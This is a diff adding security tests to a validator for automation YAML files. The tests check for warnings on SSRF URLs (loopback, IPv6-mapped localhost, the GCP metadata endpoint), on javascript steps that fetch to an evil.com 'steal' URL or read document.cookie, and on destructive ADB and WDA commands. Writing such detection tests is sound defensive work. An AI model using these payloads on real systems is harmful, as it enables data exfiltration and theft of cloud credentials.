@@ -2528,6 +2528,382 @@ tasks:
     });
   });
 
+  // ===========================================================================
+  // T191 — Security pattern tests
+  // ===========================================================================
+
+  describe('SSRF detection for external_call URLs', () => {
+    it('warns on IPv6 loopback [::1] URL', () => {
+      const yaml = `
+engine: extended
+features: [external_call]
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - external_call:
+          type: http
+          method: GET
+          url: "http://[::1]:8080/api/data"
+`;
+      const result = validate(yaml);
+      const ssrfWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('SSRF') || msg.includes('internal/private');
+      });
+      assert.ok(ssrfWarnings.length > 0, 'Should warn about IPv6 loopback [::1] SSRF risk');
+    });
+
+    it('warns on IPv6-mapped IPv4 [::ffff:127.0.0.1] URL', () => {
+      const yaml = `
+engine: extended
+features: [external_call]
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - external_call:
+          type: http
+          method: GET
+          url: "http://[::ffff:127.0.0.1]:3000/secret"
+`;
+      const result = validate(yaml);
+      const ssrfWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('SSRF') || msg.includes('internal/private');
+      });
+      assert.ok(ssrfWarnings.length > 0, 'Should warn about IPv6-mapped IPv4 SSRF risk');
+    });
+
+    it('warns on GCP metadata URL (metadata.google.internal)', () => {
+      const yaml = `
+engine: extended
+features: [external_call]
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - external_call:
+          type: http
+          method: GET
+          url: "http://metadata.google.internal/computeMetadata/v1/"
+`;
+      const result = validate(yaml);
+      const ssrfWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('SSRF') || msg.includes('internal/private');
+      });
+      assert.ok(ssrfWarnings.length > 0, 'Should warn about GCP metadata endpoint SSRF risk');
+    });
+
+    it('does not warn on public external URL', () => {
+      const yaml = `
+engine: extended
+features: [external_call]
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - external_call:
+          type: http
+          method: GET
+          url: "https://api.github.com/repos"
+`;
+      const result = validate(yaml);
+      const ssrfWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('SSRF') || msg.includes('internal/private');
+      });
+      assert.equal(ssrfWarnings.length, 0, 'Should not warn on public external URL');
+    });
+  });
+
+  describe('JS injection detection in javascript steps', () => {
+    it('warns on fetch( pattern in javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "fetch('https://evil.com/steal?data=' + document.title)"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.ok(jsWarnings.length > 0, 'Should warn about fetch( in javascript step');
+    });
+
+    it('warns on XMLHttpRequest pattern in javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "new XMLHttpRequest().open('GET', 'https://evil.com')"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.ok(jsWarnings.length > 0, 'Should warn about XMLHttpRequest in javascript step');
+    });
+
+    it('warns on document.cookie pattern in javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "var cookies = document.cookie; return cookies;"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.ok(jsWarnings.length > 0, 'Should warn about document.cookie in javascript step');
+    });
+
+    it('does not warn on safe javascript step', () => {
+      const yaml = `
+web:
+  url: "https://example.com"
+tasks:
+  - name: test
+    flow:
+      - javascript: "return document.title"
+`;
+      const result = validate(yaml);
+      const jsWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous code pattern') || msg.includes('require/eval/exec');
+      });
+      assert.equal(jsWarnings.length, 0, 'Should not warn on safe javascript');
+    });
+  });
+
+  describe('ADB dangerous command detection', () => {
+    it('warns on am force-stop in runAdbShell', () => {
+      const yaml = `
+android:
+  deviceId: "emulator-5554"
+tasks:
+  - name: test
+    flow:
+      - runAdbShell: "am force-stop com.example.app"
+`;
+      const result = validate(yaml);
+      const adbWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous command') || msg.includes('Destructive');
+      });
+      assert.ok(adbWarnings.length > 0, 'Should warn about am force-stop');
+    });
+
+    it('warns on settings put in runAdbShell', () => {
+      const yaml = `
+android:
+  deviceId: "emulator-5554"
+tasks:
+  - name: test
+    flow:
+      - runAdbShell: "settings put global airplane_mode_on 1"
+`;
+      const result = validate(yaml);
+      const adbWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous command') || msg.includes('Destructive');
+      });
+      assert.ok(adbWarnings.length > 0, 'Should warn about settings put');
+    });
+
+    it('warns on svc data disable in runAdbShell', () => {
+      const yaml = `
+android:
+  deviceId: "emulator-5554"
+tasks:
+  - name: test
+    flow:
+      - runAdbShell: "svc data disable"
+`;
+      const result = validate(yaml);
+      const adbWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous command') || msg.includes('Destructive');
+      });
+      assert.ok(adbWarnings.length > 0, 'Should warn about svc data disable');
+    });
+
+    it('does not warn on safe ADB command', () => {
+      const yaml = `
+android:
+  deviceId: "emulator-5554"
+tasks:
+  - name: test
+    flow:
+      - runAdbShell: "dumpsys window displays"
+`;
+      const result = validate(yaml);
+      const adbWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('dangerous command') || msg.includes('Destructive');
+      });
+      assert.equal(adbWarnings.length, 0, 'Should not warn on safe ADB command');
+    });
+  });
+
+  describe('runWdaRequest destructive URL detection', () => {
+    it('warns on destructive URL in runWdaRequest', () => {
+      const yaml = `
+ios:
+  wdaPort: 8100
+tasks:
+  - name: test
+    flow:
+      - runWdaRequest:
+          url: "/wda/apps/com.example.app/delete"
+          method: POST
+`;
+      const result = validate(yaml);
+      const wdaWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('destructive') && msg.includes('runWdaRequest');
+      });
+      assert.ok(wdaWarnings.length > 0, 'Should warn about destructive URL in runWdaRequest');
+    });
+
+    it('warns on uninstall URL in runWdaRequest', () => {
+      const yaml = `
+ios:
+  wdaPort: 8100
+tasks:
+  - name: test
+    flow:
+      - runWdaRequest:
+          url: "/wda/apps/uninstall"
+          method: DELETE
+`;
+      const result = validate(yaml);
+      const wdaWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('destructive') && msg.includes('runWdaRequest');
+      });
+      assert.ok(wdaWarnings.length > 0, 'Should warn about uninstall URL in runWdaRequest');
+    });
+
+    it('warns on reset URL in runWdaRequest', () => {
+      const yaml = `
+ios:
+  wdaPort: 8100
+tasks:
+  - name: test
+    flow:
+      - runWdaRequest:
+          url: "/wda/reset"
+          method: POST
+`;
+      const result = validate(yaml);
+      const wdaWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('destructive') && msg.includes('runWdaRequest');
+      });
+      assert.ok(wdaWarnings.length > 0, 'Should warn about reset URL in runWdaRequest');
+    });
+
+    it('does not warn on safe runWdaRequest URL', () => {
+      const yaml = `
+ios:
+  wdaPort: 8100
+tasks:
+  - name: test
+    flow:
+      - runWdaRequest:
+          url: "/wda/element/tap"
+          method: POST
+`;
+      const result = validate(yaml);
+      const wdaWarnings = result.warnings.filter(w => {
+        const msg = typeof w === 'object' ? w.message : w;
+        return msg.includes('destructive') && msg.includes('runWdaRequest');
+      });
+      assert.equal(wdaWarnings.length, 0, 'Should not warn on safe runWdaRequest URL');
+    });
+  });
+
+  // ===========================================================================
+  // T193 — YAML alias handling tests
+  // ===========================================================================
+
+  describe('YAML alias handling', () => {
+    it('accepts YAML with a moderate number of aliases', () => {
+      // Build YAML with 5 aliases (basic alias functionality)
+      let anchors = '';
+      let aliases = '';
+      for (let i = 0; i < 5; i++) {
+        anchors += `  anchor${i}: &a${i} "value${i}"\n`;
+        aliases += `      - aiTap: *a${i}\n`;
+      }
+      const yaml = `
+web:
+  url: "https://example.com"
+metadata:
+${anchors}tasks:
+  - name: test
+    flow:
+${aliases}`;
+      const result = validate(yaml);
+      assert.equal(result.valid, true, `YAML with 5 aliases should be valid. Errors: ${JSON.stringify(result.errors)}`);
+    });
+
+    it('correctly resolves alias values in parsed YAML', () => {
+      // Ensure that YAML anchors/aliases are resolved before validation
+      const yaml = `
+web:
+  url: "https://example.com"
+defaults:
+  selector: &btn "submit button"
+tasks:
+  - name: test
+    flow:
+      - aiTap: *btn
+`;
+      const result = validate(yaml);
+      assert.equal(result.valid, true, `YAML with alias for aiTap value should be valid. Errors: ${JSON.stringify(result.errors)}`);
+    });
+
+    it('handles YAML with many aliases without crashing (js-yaml 4.x has no maxAliases)', () => {
+      // js-yaml 4.x does not enforce maxAliases; the option is passed defensively.
+      // This test verifies the validator handles large alias counts gracefully.
+      let anchors = '';
+      let aliases = '';
+      for (let i = 0; i < 30; i++) {
+        anchors += `  anchor${i}: &a${i} "value${i}"\n`;
+        aliases += `      - aiTap: *a${i}\n`;
+      }
+      const yaml = `
+web:
+  url: "https://example.com"
+metadata:
+${anchors}tasks:
+  - name: test
+    flow:
+${aliases}`;
+      const result = validate(yaml);
+      // Should not crash — js-yaml 4.x does not limit aliases
+      assert.ok(typeof result.valid === 'boolean', 'Should return a result without crashing');
+    });
+  });
+
   describe('new platform actions do not trigger unknown warnings', () => {
     it('aiLongPress is recognized as a valid action', () => {
       const yaml = `
